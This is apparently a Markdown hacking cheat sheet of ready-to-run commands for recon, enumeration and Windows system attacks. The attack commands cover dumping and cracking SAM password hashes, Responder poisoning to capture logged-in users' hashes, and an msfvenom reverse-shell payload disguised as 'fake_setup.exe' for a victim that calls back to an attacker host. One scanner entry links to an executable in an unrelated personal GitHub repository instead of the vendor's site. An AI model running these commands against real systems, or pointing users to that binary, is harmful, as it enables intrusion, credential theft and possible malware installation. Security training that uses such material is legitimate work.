# Reconnasiance/Footprinting
<details>
  <summary>Recon</summary>

* -r range , Scan Entire Network for ALive host using ARP
```console
:~$ netdiscover -r 192.168.29.1/24
```

* -f switch do not fragment, -l buffer size
```console
:~$ ping <host-ip> -f -l 1300
```
  * __`tracert`__ for windows cmd
```console
:~$ traceroute <host-ip>
```
* [Path Analyzer Pro](https://www.pathanalyzer.com/download.opp/) in traceroute tools, ensure icmp and smart is selected, stop on control is selected
* Start Metasploit Console
```console
:~# msfdb init && msfconsole
:~# msfdb status
```
* Nmap Scanning entire Network

```console
# Don’t ping=> -Pn, SYN scan=> -sS, Aggresive Scan=> -A, Normal_XML and Grepable format all at once=> -oA, Verbose=> -vv 

nmap -Pn -sS -A -oA -vv <Filename> 10.10.1.1/24
```
* Convert Nmap XML file to [HTML Report](https://nmap.org/book/output-formats-output-to-html.html/)
```console
xsltproc <nmap-output.xml> -o <nmap-output.html>
```
```console
# Scanning SMB Version for OS Detection using Metaspolit
use scanner/smb/smb_version
show options 
set RHOSTS 10.10.10.8-16 
set THREADS 100 
run
  
#Type hosts again and os_flavor will be visible
  hosts
```
</details>

# Scanning Network
<details>
  <summary>Scan Network</summary>

* -1 for ICMP ping scan, ICMP-echo request randomly (--rand-dest)
```console
:~$ hping3 -1 10.0.1.255 --rand-dest –I eth0 
```
* [Angry IP Scanner](https://angryip.org/download/#windows) of windows to Scan Entire Network
</details>
  
# ENUMERATION
<details>
  <summary>Enum</summary>
* Advanced IP Scanner (https://github.com/infovault-Ytube/test1/raw/main/ipscan25.exe) of windows
Specify IP range and start. Right click on alive hosts to perform actions, e.g. shutdown. Use Radmin for advanced features.

* [Hyena](https://www.systemtools.com/hyena/download.htm)
Expand local workstation to view Users, Services, User Rights, Scheduled Jobs 

* [NetBIOS Enumerator](http://nbtenum.sourceforge.net/)
Enter IP Range and click scan.

* NBT (NetBIOS over TCP/IP), which helps troubleshoot NetBIOS name resolution issues.
```console
nbtstat -A 204.224.150.3
```
* Accessing Shared Files
```console.
# List All Shared Resources
net view  <IP>

# Connect to Shared Resource
net use
net use \\10.10.10.1\e ""\user:""
net use \\10.10.10.1\e ""/user:""
```
* SNMP Enumeration
```shell
nmap -sU -p 161 10.10.1.2
nmap -sU -p 161 --script=snmp-brute 10.10.1.2

# Expoilt SNMP with Metasploit
msfdb init && msfconsole ↵
use auxilary/scanner/snmp/snmp_login ↵
set RHOSTS 10.10.1.2 ↵
exploit ↵
  
use auxilary/scanner/snmp/snmp_enum ↵
set RHOSTS 10.10.1.2 ↵
exploit ↵
```
* Enum4linux: Enumerating information from Windows and Samba systems
```console
enum4linux -A <Target_IP>
```
</details>
  
  # Vulnerability Analysis
<details>
  <summary>Vulerability</summary>
  
 * Nessus: Assest vulnerability scanner
 * Nikto: Web Server scanner
```console
nikto -h www.example.com tuning 1
  ```
  </details>
  
# System Hacking
<details>
  <summary> Sys password Hacking</summary>

```
# To Dump Windows SAM file hashes
pwDump7.exe> hashes.txt 
```
  > pwDump7.exe : To Dump Windows Hashes [PwDump7](https://www.tarasco.org/security/pwdump_7/pwdump7.zip)
  * [Ophcrack.exe](https://ophcrack.sourceforge.io/download.php?type=ophcrack) : To Crack SAM Hashes to obtain clear Password 
  * [rcrack_gui.exe](http://project-rainbowcrack.com/) : Use Raindow Table to crack hashes
  
  </details>

 
<details>
  <summary> Create A Reverse TCP Connection</summary>

```shell
# creates reverse TCP from windows  machine, send this file to victim machine via python-Webserver/shared resource
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker_IP> LPORT=444 -o fake_setup.exe  ↵

msfdb init && msfconsole ↵
use exploit/multi/handler ↵
set LHOST=<attacker-IP>  ↵
set LPORT=444 ↵
  run
```
</details>

# Steganography
<details>
<summary> Stego</summary>

##### Hide/unhide text in WhiteSpaces using[snow](http://www.darkside.com.au/snow/)

```shell
SNOW.EXE -C -p 1234 -m "Secret Message"  original.txt ciper.txt
 
# To unhide the hidden text
 
SNOW.EXE -C -p 1234  ciper.txt
```
  
> [OpenStego](https://github.com/syvaidya/openstego/releases) : Hide any data within a cover file like Images
<img src="https://www.openstego.com/image/screenshot/01.png" width="600" height="400" />
<img src="https://www.openstego.com/image/screenshot/02.png" width="600" height="400" />  
  
> [QuickStego](http://cybernescence.co.uk/software-products/QS12Setup.exe): Hide text in pictures without password
<img src="http://quickcrypto.com/content-images/QuickStego_12_Steganography_Software_Ex_sml.jpg" width="600" height="400" /> 
</details>

  
  
#  LLMNR/NBT-NS Poisoning
<details>
<summary> LLMNR/NBT</summary>

> [Responder](https://github.com/lgandx/Responder) : rogue authentication server to capture hashes
>
>> This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present [Step by Step](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
  
```shell
# In Parrot/Kali OS, 
responder -I eth0  ↵

# In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
# To crack that hash, use JohntheRipper
john SMB<filename>  ↵
  
```


  
